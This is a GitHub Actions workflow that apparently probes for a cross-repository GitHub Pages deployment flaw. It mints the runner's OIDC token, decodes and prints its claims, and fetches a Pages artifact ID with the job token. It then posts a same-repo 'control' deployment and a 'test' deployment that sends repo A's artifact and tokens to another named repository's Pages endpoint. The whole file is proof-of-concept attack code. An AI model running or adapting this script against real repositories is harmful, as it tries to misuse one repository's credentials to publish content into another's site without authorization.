name: xrepo
on: [push, workflow_dispatch]
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p _site && echo "<h1>ARTIFACT-FROM-REPO-A</h1>" > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: _site
      - name: locate artifact
        run: |
          ART=$(curl -s -H "Authorization: Bearer ${{ github.token }}" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts" \
            | python3 -c 'import sys,json;a=json.load(sys.stdin)["artifacts"];print(a[0]["id"] if a else "")')
          echo "ART=$ART" >> $GITHUB_ENV
          echo "artifact id: $ART"
      - name: mint oidc + fire both arms
        run: |
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "oidc claims (repo/aud only):"
          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
            | python3 -c 'import sys,json;d=json.loads(sys.stdin.read()+"}" if not sys.stdin else {});' 2>/dev/null || \
          echo "$TOK" | cut -d. -f2 | python3 -c '
import sys,base64,json
s=sys.stdin.read().strip(); s+="="*(-len(s)%4)
d=json.loads(base64.urlsafe_b64decode(s))
print("  repository:",d.get("repository"),"| aud:",d.get("aud"),"| sub:",d.get("sub"))'
          echo "=== CONTROL same-repo (A artifact -> A pages) ==="
          curl -s -w "\n[%{http_code}]\n" -X POST \
            -H "Authorization: Bearer ${{ github.token }}" -H "Accept: application/vnd.github+json" \
            -d "{\"artifact_id\":$ART,\"pages_build_version\":\"${{ github.sha }}\",\"oidc_token\":\"$TOK\"}" \
            "https://api.github.com/repos/${{ github.repository }}/pages/deployments" | head -c 400
          echo "=== TEST cross-repo (A artifact + A oidc -> B pages) ==="
          curl -s -w "\n[%{http_code}]\n" -X POST \
            -H "Authorization: Bearer ${{ github.token }}" -H "Accept: application/vnd.github+json" \
            -d "{\"artifact_id\":$ART,\"pages_build_version\":\"${{ github.sha }}\",\"oidc_token\":\"$TOK\"}" \
            "https://api.github.com/repos/mr-benty/rationale-sink-0802/pages/deployments" | head -c 400
